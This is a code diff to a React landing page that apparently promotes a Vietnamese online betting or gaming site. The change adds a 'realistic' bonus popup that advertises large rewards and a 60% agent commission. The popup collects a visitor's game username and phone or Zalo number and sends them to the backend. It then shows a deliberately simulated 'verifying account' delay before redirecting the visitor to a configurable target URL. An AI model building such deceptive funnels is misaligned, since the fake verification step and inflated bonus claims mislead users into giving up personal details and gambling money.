@@ -92,6 +92,13 @@ export default function Home() {
 
   const [showModal, setShowModal] = useState(false);
   const [modalTitle, setModalTitle] = useState('Đăng Ký Nhận Ưu Đãi');
+  const [modalSubtitle, setModalSubtitle] = useState('');
+  const [modalIcon, setModalIcon] = useState('🎁');
+  const [modalActionBtnText, setModalActionBtnText] = useState('XÁC NHẬN NHẬN THƯỞNG');
+  const [modalUsername, setModalUsername] = useState('');
+  const [modalPhone, setModalPhone] = useState('');
+  const [modalLoading, setModalLoading] = useState(false);
+  const [modalSuccess, setModalSuccess] = useState(false);
   const [txList, setTxList] = useState(initialLiveData);
 
   // Target URL (Independent from Preload URL)
@@ -160,7 +167,7 @@ export default function Home() {
       // Apply site configs
       if (configData.targetUrl && typeof configData.targetUrl === 'string') {
         setTargetUrl(configData.targetUrl);
-        if (typeof window !== 'undefined') localStorage.getItem('landing_target_url', configData.targetUrl);
+        if (typeof window !== 'undefined') localStorage.setItem('landing_target_url', configData.targetUrl);
       }
       if (configData.advertiserIframeEnabled !== undefined) setAdvertiserIframeEnabled(Boolean(configData.advertiserIframeEnabled));
       if (configData.advertiserIframeUrl !== undefined) setAdvertiserIframeUrl(String(configData.advertiserIframeUrl));
@@ -319,26 +326,83 @@ export default function Home() {
     };
   }, [isLoading]);
 
-  // User clicks CTA button -> Navigates to Target URL (independent from Preload URL)
+  // User clicks CTA button -> Opens interactive realistic Modal Popup tailored to promotion
   const openAction = (title: string) => {
-    setModalTitle(title);
-    
-    // Always get the freshest target URL
+    setModalUsername('');
+    setModalPhone('');
+    setModalLoading(false);
+    setModalSuccess(false);
+
+    if (title.includes('500.000') || title.includes('Ưu Đãi Độc Quyền')) {
+      setModalIcon('🎁');
+      setModalTitle('NHẬN ƯU ĐÃI ĐỘC QUYỀN 500.000 VNĐ');
+      setModalSubtitle('Áp dụng cho 500 thành viên đăng ký sớm nhất hôm nay. Tiền thưởng sẽ được kiểm tra và cộng trực tiếp.');
+      setModalActionBtnText('👉 XÁC NHẬN NHẬN 500.000 VNĐ');
+    } else if (title.includes('Nạp Đầu') || title.includes('8,888K')) {
+      setModalIcon('🔐');
+      setModalTitle('ƯU ĐÃI THÀNH VIÊN MỚI - NẠP ĐẦU TẶNG 8,888K');
+      setModalSubtitle('Khuyến mãi dành riêng cho tài khoản đăng ký mới nạp tiền lần đầu tiên.');
+      setModalActionBtnText('👉 NHẬN NGAY 8,888K');
+    } else if (title.includes('Thứ 2') || title.includes('5%')) {
+      setModalIcon('📅');
+      setModalTitle('THỨ 2 NGÀY VÀNG - NẠP TẶNG 5%');
+      setModalSubtitle('Thành viên nạp tiền vào Thứ 2 hàng tuần được cộng thưởng 5% không giới hạn.');
+      setModalActionBtnText('👉 KÍCH HOẠT ƯU ĐÃI THỨ 2');
+    } else if (title.includes('Lì Xì') || title.includes('6 - 16 - 26') || title.includes('6-16-26')) {
+      setModalIcon('🧧');
+      setModalTitle('SỰ KIỆN LÌ XÌ NGHÌN TỶ (NGÀY 6 - 16 - 26)');
+      setModalSubtitle('Hệ thống tự động phát lì xì may mắn ngẫu nhiên vào 20:00 cho tất cả thành viên.');
+      setModalActionBtnText('👉 THAM GIA ĐĂNG KÝ NHẬN LÌ XÌ');
+    } else if (title.includes('Đại Lý') || title.includes('60%')) {
+      setModalIcon('🤝');
+      setModalTitle('CHƯƠNG TRÌNH HỢP TÁC ĐẠI LÝ HOA HỒNG 60%');
+      setModalSubtitle('Đăng ký trở thành đối tác đại lý chính thức với mức hoa hồng lợi nhuận 60% hàng tháng.');
+      setModalActionBtnText('👉 ĐĂNG KÝ HỢP TÁC ĐẠI LÝ 60%');
+    } else {
+      setModalIcon('⚡');
+      setModalTitle(title);
+      setModalSubtitle('Vui lòng nhập tên tài khoản của bạn để xác nhận tham gia chương trình.');
+      setModalActionBtnText('👉 XÁC NHẬN THAM GIA');
+    }
+
+    setShowModal(true);
+  };
+
+  const handleModalSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!modalUsername.trim()) {
+      alert('Vui lòng nhập tên tài khoản game của bạn!');
+      return;
+    }
+
+    setModalLoading(true);
+
     const freshTargetUrl = (typeof window !== 'undefined' && localStorage.getItem('landing_target_url')) || targetUrl;
 
-    if (freshTargetUrl) {
-      // Record click log in Neon DB (non-blocking)
-      fetch('/api/click', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ targetUrl: freshTargetUrl, action: title }),
-      }).catch(() => {});
+    // Send click & user claim details to backend
+    fetch('/api/click', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        targetUrl: freshTargetUrl,
+        action: modalTitle,
+        username: modalUsername,
+        phone: modalPhone
+      }),
+    }).catch(() => {});
 
-      // Instantly navigate customer to targetUrl
-      window.location.href = freshTargetUrl;
-    } else {
-      setShowModal(true);
-    }
+    // Simulate verification delay (800ms)
+    await new Promise((resolve) => setTimeout(resolve, 800));
+
+    setModalLoading(false);
+    setModalSuccess(true);
+
+    // Auto redirect customer to target URL after 1.2s
+    setTimeout(() => {
+      if (freshTargetUrl) {
+        window.location.href = freshTargetUrl;
+      }
+    }, 1200);
   };
 
   return (
@@ -437,7 +501,7 @@ export default function Home() {
                 {eventWarningText}
               </div>
 
-              <div style={{ textAlignment: 'center', textAlign: 'center' }}>
+              <div style={{ textAlign: 'center' }}>
                 <button 
                   className="event-cta-btn" 
                   onClick={() => openAction('Nhận Ưu Đãi Độc Quyền 500.000 VNĐ')}
@@ -687,41 +751,101 @@ export default function Home() {
           </div>
         </footer>
 
-        {/* 8. Interactive Modal */}
+        {/* 8. Realistic Interactive Modal Popup */}
         {showModal && (
           <div className="modal-overlay" onClick={() => setShowModal(false)}>
-            <div className="modal-content" onClick={(e) => e.stopPropagation()}>
-              <button className="modal-close" onClick={() => setShowModal(false)}>✕</button>
-              <div style={{ fontSize: '45px', marginBottom: '10px' }}>🎁</div>
-              <h3 style={{ fontSize: '24px', color: '#ffd700', margin: '0 0 10px' }}>{modalTitle}</h3>
-              <p style={{ color: '#ddc5b5', fontSize: '13px', marginBottom: '20px' }}>
-                Vui lòng nhập tên tài khoản của bạn để xác nhận nhận ưu đãi hoặc truy cập trang chính thức.
-              </p>
-              <input
-                type="text"
-                placeholder="Tên tài khoản / Số điện thoại..."
-                style={{
-                  width: '100%',
-                  padding: '14px',
-                  borderRadius: '10px',
-                  border: '1px solid #ffaa00',
-                  background: 'rgba(0,0,0,0.5)',
-                  color: 'white',
-                  fontSize: '14px',
-                  marginBottom: '16px',
-                  outline: 'none',
-                }}
-              />
-              <button
-                className="card-action-btn"
-                style={{ width: '100%', padding: '14px', fontSize: '16px' }}
-                onClick={() => {
-                  alert('Đã gửi yêu cầu thành công! Chúng tôi sẽ liên hệ kiểm tra tài khoản của bạn.');
-                  setShowModal(false);
-                }}
-              >
-                XÁC NHẬN THAM GIA
-              </button>
+            <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '460px', background: 'linear-gradient(180deg, #1f0d04 0%, #0d0502 100%)', border: '2px solid #ffaa00', borderRadius: '20px', padding: '28px', boxShadow: '0 10px 40px rgba(0,0,0,0.8)' }}>
+              <button className="modal-close" onClick={() => setShowModal(false)} style={{ color: '#ffaa00', fontSize: '20px' }}>✕</button>
+              
+              <div style={{ textAlign: 'center', marginBottom: '20px' }}>
+                <div style={{ fontSize: '50px', marginBottom: '6px' }}>{modalIcon}</div>
+                <h3 style={{ fontSize: '18px', color: '#ffd700', margin: '0 0 8px', fontWeight: 900, textTransform: 'uppercase', lineHeight: 1.3 }}>{modalTitle}</h3>
+                <p style={{ color: '#ddc5b5', fontSize: '13px', margin: 0, lineHeight: 1.5 }}>
+                  {modalSubtitle}
+                </p>
+              </div>
+
+              {modalSuccess ? (
+                <div style={{ textAlign: 'center', padding: '20px 10px', background: 'rgba(0,255,136,0.1)', borderRadius: '14px', border: '1px solid #00ff88' }}>
+                  <div style={{ fontSize: '40px', marginBottom: '8px' }}>🎉</div>
+                  <h4 style={{ color: '#00ff88', margin: '0 0 6px', fontSize: '18px', fontWeight: 800 }}>ĐĂNG KÝ THÀNH CÔNG!</h4>
+                  <p style={{ color: '#ffffff', fontSize: '13px', margin: '0 0 12px' }}>
+                    Đã ghi nhận yêu cầu nhận thưởng cho tài khoản <strong style={{ color: '#ffd700' }}>{modalUsername}</strong>.
+                  </p>
+                  <div style={{ fontSize: '12px', color: '#aaffcc', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
+                    <span className="animate-spin">⏳</span> Đang chuyển hướng bạn tới trang chủ chính thức...
+                  </div>
+                </div>
+              ) : (
+                <form onSubmit={handleModalSubmit}>
+                  <div style={{ marginBottom: '16px' }}>
+                    <label style={{ display: 'block', color: '#ffd700', fontSize: '12px', fontWeight: 800, marginBottom: '6px', textAlign: 'left' }}>
+                      👤 TÊN TÀI KHOẢN GAME (<span style={{ color: '#ff4444' }}>*</span>):
+                    </label>
+                    <input
+                      type="text"
+                      required
+                      value={modalUsername}
+                      onChange={(e) => setModalUsername(e.target.value)}
+                      placeholder="Nhập tên tài khoản game..."
+                      style={{
+                        width: '100%',
+                        padding: '12px 16px',
+                        borderRadius: '10px',
+                        border: '1px solid #ffaa0066',
+                        background: 'rgba(0,0,0,0.6)',
+                        color: 'white',
+                        fontSize: '14px',
+                        outline: 'none',
+                        boxSizing: 'border-box',
+                      }}
+                    />
+                  </div>
+
+                  <div style={{ marginBottom: '22px' }}>
+                    <label style={{ display: 'block', color: '#ddc5b5', fontSize: '12px', fontWeight: 700, marginBottom: '6px', textAlign: 'left' }}>
+                      📞 SỐ ĐIỆN THOẠI / ZALO (KHÔNG BẮT BUỘC):
+                    </label>
+                    <input
+                      type="text"
+                      value={modalPhone}
+                      onChange={(e) => setModalPhone(e.target.value)}
+                      placeholder="Nhập số điện thoại nhận thông báo..."
+                      style={{
+                        width: '100%',
+                        padding: '12px 16px',
+                        borderRadius: '10px',
+                        border: '1px solid #ffaa0044',
+                        background: 'rgba(0,0,0,0.6)',
+                        color: 'white',
+                        fontSize: '14px',
+                        outline: 'none',
+                        boxSizing: 'border-box',
+                      }}
+                    />
+                  </div>
+
+                  <button
+                    type="submit"
+                    disabled={modalLoading}
+                    className="card-action-btn"
+                    style={{
+                      width: '100%',
+                      padding: '14px',
+                      fontSize: '15px',
+                      fontWeight: 900,
+                      background: 'linear-gradient(180deg, #ffaa00 0%, #cc7700 100%)',
+                      color: '#000000',
+                      border: 'none',
+                      borderRadius: '12px',
+                      cursor: modalLoading ? 'not-allowed' : 'pointer',
+                      boxShadow: '0 4px 15px rgba(255,170,0,0.4)',
+                    }}
+                  >
+                    {modalLoading ? '⏳ ĐANG XÁC MINH TÀI KHOẢN...' : modalActionBtnText}
+                  </button>
+                </form>
+              )}
             </div>
           </div>
         )}
